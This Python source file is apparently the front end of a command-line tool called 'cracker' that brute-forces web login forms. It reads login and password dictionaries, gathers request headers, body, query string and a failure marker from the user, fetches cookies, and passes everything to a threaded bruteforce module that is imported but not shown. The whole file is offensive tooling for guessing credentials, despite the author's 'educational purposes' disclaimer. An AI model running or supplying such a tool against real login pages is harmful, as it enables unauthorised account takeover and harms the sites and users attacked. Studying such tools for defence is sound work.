## ============================================================================== ##
##                                                                                ##
## Author : Eliseev Vlad 							  ##
## Contact link : https://github.com/shmel3 					  ##
## License : All entire code is published under a GNU GPLv3 license               ##
##								                  ##
## =============================== Notes from author ============================ ##
##									          ##
## This program was written in educational purposes.				  ##
## Please, never use it with malicious intent.				          ##
## You are free to use any of this code in your program, but I would be grateful  ##
## if you leave my contact link in it.                                            ##
##                                                                                ##
## ============================================================================== ##

### TODO ###
# * read query string - done
# * let user set whole http request without parsing html - done
# * rewrite commands - done (commands removed)
# * add argparse - done
# * add colors
### END TODO ###



### IMPORT MODULES ###
from urllib.parse import urlparse, parse_qs
import bruteforce as bf
import argparse
import requests
### END MODULES ###




# ================================= REQUEST_PATTERN CLASS ================================= #
"""
Class 'target' contains main information about html code of target page:
	* all html forms (<form method=...> ... </form>) found in code;
	* login_form that has login and password input (guessed by program or specified by user);
	* login_form_id that is actually its index in html_forms list;
	* login_var - name variable that holds login user input 
	* pass_var - the same as login_var, but holds password user input
"""
	
class RequestPattern:
	def __init__(self):
		self.url = str()
		self.cookies = { }
		self.request_body = { }
		self.headers = { }
		self.query = { }
		self.unsuccess_sign = str()
		self.login_var = str()
		self.pass_var = str()
		self.http_method = str()
	
# ================================= CLASS END ================================= #		








# ================================= MAIN FUNCTIONS ================================= #
def define_args():
	parser = argparse.ArgumentParser(prog='cracker')

	login_group = parser.add_mutually_exclusive_group(required = True)
	login_group.add_argument('-l', metavar = 'LOGIN', help = 'set attack login')
	login_group.add_argument('-L', metavar = 'dict.txt', help = 'set login dictionary')

	password_group = parser.add_mutually_exclusive_group(required = True)
	password_group.add_argument('-p', metavar = 'PASSWORD', help = 'set attack password')
	password_group.add_argument('-P', metavar = 'dict.txt', help = 'set password dictionary')

	parser.add_argument('-m', metavar = "HTTP_METHOD", required = True, help = 'set http request method (POST, GET, etc.)')

	parser.add_argument('-t', metavar = 'THREADS', type = int , default = 3, help = 'set number of threads to use (default: 3)')
	parser.add_argument('target', help = 'set target host (specify login action if it exists) e.g. https://target.com/login.php')
	parser.add_argument('--reverse', '-r', action = 'store_false', help = 'set brute force attack type')
	return parser



def main(args):
	logins, passwords = [], []
	login = args['l']
	login_dict_path = args['L']
	password = args['p']
	password_dict_path = args['P']
	num_threads = 3 
	url = args['target']
	method = args['m']
	
	# set brute force login(s) #
	if login_dict_path:
		login_dict = open(login_dict_path, 'r')
		logins = [login.replace('\n', '') for login in login_dict]
	elif login:
		logins.append(login)
	
	# set brute force password(s) #
	if password_dict_path:
		password_dict = open(password_dict_path, 'r')
		passwords = [passwd.replace('\n', '') for passwd in password_dict]
	elif password:
		passwords.append(password)

	# specify number of threads to use #
	if args['t']:
		num_threads = args['t']
	if login and password:
		num_threads = 1


	print('Starting brute force attack.')
	request_pattern = generate_request_pattern()
	request_pattern.url = url + request_pattern.query
	request_pattern.http_method = method
	print('Getting Cookie...')
	request_pattern.cookies = requests.get(request_pattern.url).cookies
	print('Done.')
	
	# brute force attack #
	bf.brute_force(request_pattern, logins, passwords, num_threads)
	
	

# ================================= END OF FUNCTIONS ================================= #	








# ================================= APPLICATION COMMANDS ================================= #

def ask_http_headers():
	print('Set http headers: ')
	headers = { }
	header = input()
	while header:
		key = header.split(':')[0]
		value = header.split(':')[1]
		headers[key] = value
		header = input()
	return headers


def ask_query_string():
	"""
	Returns query string e.g. ?var1=value1&var2=value2
	"""
	print('Set query string: ')
	query = "?" 
	param = input()
	if param.count('&') > 0 and param.count('=') > 1:
		return query + param
	
	while param:
		query += param
		query += '&'
		param = input()
	
	return query[:-1] # remove last '&' symbol #


def ask_request_body():
	item = input('Set request body: ')
	body = { }
	if item.count('=') > 1 and item.count('&') > 0:
		for i in item.split('&'):
			key = i.split('=')[0]
			value = i.split('=')[1]
			body[key] = value
	else:
		while item:
			key = item.split('=')[0]
			value = item.split('=')[1]
			body[key] = value
			item = input()
	return body


def ask_cookies():
	print('Set cookies: ')
	cookies = { }
	param = input()
	while param:
		key = param.split('=')[0]
		value = param.split('=')[1]
		cookies[key] = value
		param = input()
	return cookies


def ask_unsuccess_sign():
	"""
	 Function asks user to set unsuccess sign. 
	 unsuccess_sign is string that is stored in html code of page
	 if auth request was unsuccessful.
	 e.g. "Failed login attemp.", "Error. Try again.", etc.
	"""
	return input('Set unsuccess sign (look help for more info): ')


def ask_login_var():
	login_var = input('Login variable: ')
	return login_var


def ask_password_var():
	pass_var = input('Password variable: ')
	return pass_var



def generate_request_pattern():
	"""
	Generate http request pattern by user input:
		* set headers
		* set cookies
		* set request body
		* set query string
	"""
	req = RequestPattern()
	req.headers = ask_http_headers()
	req.query = ask_query_string()
	# req.cookies = ask_cookies()
	req.request_body = ask_request_body()
	req.login_var = ask_login_var()
	req.pass_var = ask_password_var()
	req.unsuccess_sign = ask_unsuccess_sign()
	return req

# ================================= END OF COMMANDS ================================= #
	


### START PROGRAM ###
if __name__ == "__main__":
	parser = define_args()
	args = vars(parser.parse_args())
	main(args)
### PROGRAM FINISHED ###
